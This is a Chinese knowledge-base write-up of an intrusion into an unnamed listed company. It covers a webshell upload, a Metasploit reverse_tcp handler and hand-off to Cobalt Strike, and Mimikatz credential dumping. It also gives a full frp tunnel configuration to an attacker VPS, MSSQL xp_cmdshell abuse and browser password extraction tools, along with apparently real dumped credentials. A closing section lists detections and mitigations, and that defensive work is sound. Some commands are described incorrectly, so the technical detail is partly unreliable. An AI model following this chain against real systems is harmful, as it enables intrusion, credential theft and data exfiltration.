---
title: 上市公司渗透测试全流程复现：从文件上传到云管理后台接管
description: 完整复现某上市公司渗透测试实战链路：文件上传拿 Shell → Godzilla 上线 MSF → MSF 会话传递给 Cobalt Strike
  → 提权凭证导出 → frp 内网穿透 → MSSQL 横向移动 → 浏览器凭证复用至云管理后台。涵盖 Web 入口、C2 基础设施对接、内网穿透、横向移动、凭证复用等核心红队技术环节。
category: program-analysis
tags:
- 渗透测试
- 实战案例
- 文件上传
- Cobalt Strike
- Metasploit
- 会话传递
- 提权
- 凭证导出
- frp
- 内网穿透
- 横向移动
- MSSQL
- 浏览器凭证
- 云管理后台
- 红队技术
date: 2024-01-15
updated: '2026-11-15'
---

## 概述

本页面整合自火线 Zone 实战复盘文章，记录一次针对某上市公司的完整渗透测试攻击链。攻击链覆盖 **Web 入口突破 → C2 会话对接 → 权限提升与凭证窃取 → 内网穿透建立通道 → 数据库横向移动 → 云管理后台凭证复用** 等核心环节，展示了从外网边界到核心业务系统的完整渗透路径。

> **来源声明**：原文首发于火线 Zone（https://zone.huoxian.cn/d/1000），作者「小黑」。本页面仅作技术复盘与知识沉淀，所有漏洞均为公开漏洞利用，严禁用于非授权测试。

---

## 攻击链全景图

```mermaid
flowchart LR
    A[文件上传漏洞] --> B[Godzilla WebShell]
    B --> C[MSF 反弹会话]
    C --> D[MSF → CS 会话传递]
    D --> E[Beacon 上线]
    E --> F[提权 + Mimikatz 导出凭证]
    F --> G[frp 内网穿透]
    G --> H[192.168.1.120 目标主机]
    H --> I[MSSQL 凭证获取]
    I --> J[浏览器保存密码复用]
    J --> K[云渠商应用系统后台]
```

---

## 0x01 Web 入口突破：文件上传拿 Shell

### 漏洞利用过程

目标系统存在**文件上传漏洞**，攻击者上传 WebShell 文件（如 `.jsp`、`.php` 或 `.asp` 取决于中间件），绕过前端校验、MIME 类型检测、`getimagesize` 等常见防护，成功落地可执行脚本。

### 关键技术点

- **文件上传绕过技术栈**：前端 JS 校验绕过 → `Content-Type` 伪造 → 魔数/文件头绕过 → 解析漏洞利用（如 IIS 6.0/7.5、Apache、Nginx 解析差异）
- **WebShell 选择**：使用 **Godzilla（哥斯拉）** 动态加密 WebShell，流量加密对抗 WAF/IDS 检测
- **落地验证**：通过蚁剑/哥斯拉客户端连接确认执行权限

> 相关技术详解：[[php-webshell-fundamentals-chopper-analysis]]、[[php-webshell-obfuscation-av-evasion]]、[[xd-security-file-inclusion-notes]]（含上传绕过专节）、[[pikachu-target-writeup-part4]]（文件上传多层绕过实战）

---

## 0x02 C2 基础设施对接：MSF 会话传递给 Cobalt Strike

### 操作流程

1. **MSF 监听器配置**：`use exploit/multi/handler` + `set payload windows/x64/meterpreter/reverse_tcp`
2. **Godzilla 执行命令**：在 WebShell 中执行 `msfvenom` 生成的 Payload 或直接反弹 Meterpreter
3. **会话建立**：MSF 收到 Meterpreter 会话
4. **会话传递至 CS**：
   - 方法一：`generate -t raw -f raw -o payload.bin` → CS `script` 导入
   - 方法二：MSF `sessions -u <session_id>` 直接升级为 CS Beacon（需 CS Team Server 配置 `metasploit` 监听器）
   - 方法三：使用 `msfconsole` 中 `use post/multi/manage/shell_to_meterpreter` 配合 CS External C2

### 实战截图对应步骤

| 图编号 | 对应操作 |
|--------|----------|
| 图 2-1 | Godzilla 客户端连接 WebShell |
| 图 2-2 | MSF `sessions` 列表与 `sessions -u` 传递命令 |
| 图 2-3 | Cobalt Strike Beacon 成功上线 |

> 相关技术详解：[[cobalt-strike-external-c2-smb-beacon]]（External C2 与会话传递）、[[metasploit-framework-basics-tutorial]]（MSF 基础与会话管理）、[[xd-security-internal-network-penetration-notes-day69-70]]（CS 部署、监听器、Beacon 生成、MSF 会话移交实战）、[[c2-redirectors-malleable-c2-profiles]]（C2 基础设施隐匿）

---

## 0x03 权限提升与凭证窃取

### 提权路径

Beacon 上线后，当前权限通常为 Web 服务进程用户（如 `NETWORK SERVICE`、`www-data`、普通域用户）。需提权至 `SYSTEM` 或本地管理员以导出 LSASS 凭证。

**常用提权向量**：
- 内核漏洞利用（如 **Dirty COW CVE-2016-5195**、CVE-2021-3493、CVE-2022-0847 DirtyPipe）
- 服务配置不当（非受保护服务路径、DLL 劫持、AlwaysInstallElevated）
- 令牌窃取/冒充（`incognito`、`make_token`、烂土豆/Juicy Potato 系列）
- 数据库提权（MSSQL `xp_cmdshell`、MySQL UDF、Oracle Java 类）

> 相关技术详解：[[xd-security-privilege-escalation-notes-day58-64]]（Windows/Linux/数据库提权全景）、[[cve-2016-5195-dirty-cow-linux-kernel-privilege-escalation]]、[[cve-2022-0847-dirty-pipe-linux-kernel-privilege-escalation]]、[[vulnhub-admx-new-writeup]]（MySQL UDF 提权实战）

### 凭证导出

提权至 `SYSTEM` 后，使用 **Mimikatz** 导出内存凭证：

```bash
privilege::debug
sekurlsa::logonpasswords
```

**实战产出**（原文图 3-1）：
```
Administrator / ris.jmjt123
```

> 相关技术详解：[[mimikatz-sekurlsa-pth-internals]]（sekurlsa::pth 与 logonpasswords 底层原理）、[[mimikatz-source-code-architecture-golden-ticket-audit]]（Mimikatz 模块架构）、[[xd-security-internal-network-penetration-notes-day67-68]]（Procdump + Mimikatz 凭证导出实战、PTH/PTK/PTT 三大凭证复用技术）

---

## 0x04 内网穿透：frp 建立隐蔽通道

### 部署拓扑

```
[攻击者 VPS] <-- frps (公网) --> [跳板机/目标服务器] <-- frpc --> [内网目标 192.168.1.120]
```

### 关键配置

**frps.ini (VPS)**：
```ini
[common]
bind_port = 7000
token = <strong_token>
```

**frpc.ini (跳板机)**：
```ini
[common]
server_addr = <VPS_IP>
server_port = 7000
token = <strong_token>

[ssh_tunnel]
type = tcp
local_ip = 127.0.0.1
local_port = 3389  # 或 445, 1433, 3306 等
remote_port = 6000
```

### 实战用途

- **RDP/SSH 直连**：将内网 3389/22 映射至 VPS 端口，配合凭证直接登录
- **Socks5 代理**：`frpc` 开启 `plugin = socks5`，配合 Proxychains/Proxytool 实现全工具链代理化
- **多级隧道串联**：跳板机再启 frpc 连向更深层网段

> 相关技术详解：[[frp内网渗透应用]]（frp 四大典型场景完整配置）、[[internal-network-pivoting-techniques]]（Venom/Frp/SSH/CS SMB Beacon/iox 等代理技术横向对比）、[[xd-security-internal-network-penetration-notes-day69-70]]（Ngrok/Frp/MSF 路由/SOCKS 代理三层内网渗透演练）、[[iox-proxy-protocol-evasion]]（流量指纹对抗型代理工具）

---

## 0x05 横向移动：MSSQL 数据库接管

### 攻击路径

1. **凭证复用**：使用导出的 `Administrator / ris.jmjt123` 尝试 SMB (445)、RDP (3389)、MSSQL (1433) 登录
2. **MSSQL 连接**：通过 `sqsh`、`impacket-mssqlclient`、Navicat、DBeaver 等客户端连接
3. **权限利用**：
   - `xp_cmdshell` 开启执行系统命令
   - `sp_oacreate` / `sp_oamethod` COM 对象执行
   - 沙箱绕过（`xp_dirtree`、`xp_fileexist` 读取文件）
   - 链接服务器攻击（`OPENQUERY` 注入）

### 实战产出（原文图 3-3）

翻阅目标服务器配置文件、连接字符串、备份脚本，获取 MSSQL `sa` 或高权限账号密码，成功登录数据库。

> 相关技术详解：[[xd-security-internal-network-penetration-notes-day67-68]]（SMB/WMI/Pass-the-Hash 横向移动、Ladon 内网扫描）、[[xd-security-src-vulnerability-hunting-notes-day86-88]]（MSSQL 写 Shell 编码问题、单点登录漏洞）、[[named-pipe-smb-detection-sysmon]]（SMB 命名管道横向移动检测对抗）

---

## 0x06 凭证复用：浏览器保存密码 → 云管理后台

### 攻击面

目标服务器（192.168.1.120）为运维/管理人员常用主机，浏览器（Chrome/Edge/Firefox/IE）保存了**云渠商应用系统**的登录凭证。

### 凭证提取工具链

| 工具 | 支持浏览器 | 核心原理 |
|------|------------|----------|
| **SharpChrome** / **SharpEdge** | Chrome/Edge (Chromium) | 读取 `Login Data` SQLite，调用 `CryptUnprotectData` 解密（需同用户上下文） |
| **LaZagne** | 全平台多浏览器 | 集成各浏览器解密模块，支持 WiFi、邮件、数据库等凭证 |
| **BrowserGhost** | Chrome/Edge/Firefox | 纯内存读取，无文件落地 |
| **mimikatz `dpapi::chrome`** | Chrome/Edge | DPAPI 解密 Master Key → 解密 Login Data |

### 实战产出（原文图 3-4、3-5）

```
URL: 云渠商应用系统后台
Username: admin
Password: admin123
```

成功登录后台，获取业务数据、客户信息、配置凭证等敏感资产。

> 相关技术详解：[[xd-security-internal-network-penetration-notes-day67-68]]（凭证获取与复用）、[[hackbrowserdata]] 相关工具（zig 交叉编译部署）、[[cve-2023-24055-keepass-plaintext-transmission]]（密码管理器凭证窃取变种）

---

## 0x07 防御视角与检测建议

### 关键检测点

| 阶段 | 检测手段 | 关键日志/特征 |
|------|----------|---------------|
| 文件上传 | WAF/应用层日志、文件完整性监控 (FIM) | 高危扩展名、异常 `Content-Type`、WebShell 特征（`eval`、`assert`、`@eval`、`preg_replace /e`） |
| MSF/CS 上线 | EDR/杀软、网络流量分析 (NDR) | Meterpreter/Beacon 特征流量（默认证书、Heartbeat 间隔、User-Agent）、内存特征（`reflective DLL injection`、RWX 内存、睡眠掩码） |
| 会话传递 | 进程创建审计 (Sysmon 4688/Event ID 1) | `rundll32.exe`、`powershell.exe` 启动异常子进程、命令行含 Base64/编码 Payload |
| 提权/凭证导出 | Sysmon Event ID 10 (进程访问)、EDR 内存扫描 | `lsass.exe` 被 `OpenProcess(PROCESS_VM_READ)`、`sekurlsa::logonpasswords` 字符串、Minidump 写入 |
| frp/隧道 | 网络基线、流量指纹、连接异常 | 长连接、固定心跳间隔、非业务端口、Socks5 握手特征 |
| MSSQL 横向 | 数据库审计、登录失败监控 | `xp_cmdshell` 启用、`sa` 登录异常、链接服务器创建 |
| 浏览器凭证窃取 | 终端检测 (EDR/HIDS)、DPAPI 监控 | 读取 `%LocalAppData%\Google\Chrome\User Data\Default\Login Data`、调用 `CryptUnprotectData` |

### 缓解措施

1. **Web 层**：严格文件上传白名单、禁用脚本执行目录、部署 WAF 规则、RASP/IAST 实时防护
2. **主机层**：开启 **LSA Protection (RunAsPPL)**、配置 **Credential Guard**、**禁止 LM/NTLMv1**、**限制本地管理员远程登录**
3. **网络层**：零信任网络分段、禁用非必要 SMB/RDP/MSSQL 对外暴露、部署 **Sysmon + SIEM** 关联分析
4. **凭证管理**：推广 **密码管理器**（而非浏览器保存）、强制 **MFA**、定期轮换服务账号密码、实施 **Tiered Administration** 模型
5. **应急响应**：建立 **WebShell 应急排查 SOP**、**凭证泄露应急处置流程**、**内网横向移动溯源剧本**

> 相关技术详解：[[xd-security-incident-response-notes]]（应急响应标准流程、日志分析、WebShell 溯源、勒索病毒处置、自动化工具箱）、[[threat-attribution-tracing-techniques]]（威胁溯源全技术体系）、[[memory-scanning-tools-evasion-techniques]]（内存扫描工具与 UDRL 对抗现状）、[[windows-token-nerfing-pplguard-trusted-labels]]（PPLGuard 防护 Token 篡改）

---

## 0x08 知识图谱交叉引用索引

### 核心技术页面

| 技术域 | 页面 | 说明 |
|--------|------|------|
| Web 入口 | [[php-webshell-fundamentals-chopper-analysis]] | PHP 一句话木马原理与蚁剑/菜刀连接流程 |
| Web 入口 | [[php-webshell-obfuscation-av-evasion]] | PHP WebShell 混淆免杀工程化实现 |
| C2 对接 | [[cobalt-strike-external-c2-smb-beacon]] | CS External C2、SMB Beacon、会话传递完整架构 |
| C2 对接 | [[metasploit-framework-basics-tutorial]] | MSF 安装、监听器、Payload 生成、会话管理 |
| C2 基建 | [[c2-redirectors-malleable-c2-profiles]] | 重定向器、Malleable C2 Profile、域名前置 |
| 提权/凭证 | [[xd-security-privilege-escalation-notes-day58-64]] | Windows/Linux/数据库提权、烂土豆、Dirty COW、令牌窃取 |
| 提权/凭证 | [[mimikatz-sekurlsa-pth-internals]] | sekurlsa::logonpasswords/pth 底层内存补丁原理 |
| 内网穿透 | [[frp内网渗透应用]] | frp 四大场景配置实战（Socks5、多级、MSF 代理、RDP 转发） |
| 内网穿透 | [[internal-network-pivoting-techniques]] | Venom/Frp/SSH/CS SMB Beacon/iox 横向对比与工具链代理化 |
| 内网穿透 | [[iox-proxy-protocol-evasion]] | iox 协议握手、加密、随机 Padding、协议栈重构对抗沙箱 |
| 横向移动 | [[xd-security-internal-network-penetration-notes-day67-68]] | SMB/WMI/PTH/PTK/PTT、黄金/白银票据、Ladon 扫描 |
| 横向移动 | [[named-pipe-smb-detection-sysmon]] | SMB 命名管道检测 (Sysmon 17/18)、网络基线 |
| 凭证复用 | [[xd-security-internal-network-penetration-notes-day69-70]] | Kerberoasting、RDP 凭证复用、SOCKS 代理三层渗透 |
| 应急响应 | [[xd-security-incident-response-notes]] | Day71-75 完整应急流程、日志分析、工具箱 |
| 应急响应 | [[threat-attribution-tracing-techniques]] | IP 定位、钓鱼溯源、样本分析、主机取证、流量回溯 |

### 实战案例页面

| 场景 | 页面 | 关联点 |
|------|------|--------|
| 教育 SRC 实战 | [[edu-src-penetration-test-case-study]] | FOFA 资产发现 → 弱口令 → 文件上传 Getshell → 蚁剑连接 |
| 医疗系统内网 | [[medical-system-internal-penetration-case-study]] | 越权上传 → 凭证导出 → 横向移动 → 多数据系统权限获取 |
| VulnHub 靶机 | [[vulnhub-boredhackerblog-social-network-writeup]] | 代码注入 → Docker 逃逸 → 代理隧道 → 横向移动 → 提权全链路 |
| GKCTF 实战 | [[gkctf-2021-web-writeup]] | NoSQL 盲注 → Session Upload Progress Getshell → WebLogic CVE-2020-14882 → **frp 内网穿透** |
| 0x6270 团队 | [[0x6270-hvv-vulnerability-threat-intelligence]] | HVV 护网期间漏洞威胁情报、知识星球技术分享渠道 |

---

## 0x09 结语

本案例展示了**从单一 Web 漏洞切入，通过 C2 基础设施灵活对接、权限提升与凭证窃取、内网穿透建立持久通道、数据库横向移动、最后通过浏览器凭证复用拿下云管理后台**的完整红队作业链路。每个环节均对应成熟的攻击技术与对应的检测对抗体系，适合作为**红队实战复盘、蓝队检测规则编写、紫队对抗演练**的参考教案。

> **合规提醒**：所有技术仅限授权渗透测试、红队演练、安全研究与教学使用。未经书面授权对目标系统实施测试违反《网络安全法》及相关法规，后果自负。

---

## 附录：原文图片索引（占位）

| 图编号 | 原文描述 | 对应章节 |
|--------|----------|----------|
| 图 2-1 | 哥斯拉 WebShell 连接界面 | 0x01 |
| 图 2-2 | MSF 会话列表与 `sessions -u` 传递命令 | 0x02 |
| 图 2-3 | Cobalt Strike Beacon 上线截图 | 0x02 |
| 图 3-1 | Mimikatz `sekurlsa::logonpasswords` 输出 Administrator/ris.jmjt123 | 0x03 |
| 图 3-2 | 192.168.1.120 服务器桌面/文件管理器 | 0x04 |
| 图 3-3 | MSSQL 数据库连接/查询界面 | 0x05 |
| 图 3-4 | 浏览器保存密码：admin/admin123 | 0x06 |
| 图 3-5 | 云渠商应用系统后台数据界面 | 0x06 |

---

*页面维护者：知识库策展人 | 最后更新：2024-01-15 | 版本：v1.0*

## 来源

- [0x6270安全团队-202203-202304_38](../sources/0x6270安全团队-202203-202304_38.md)
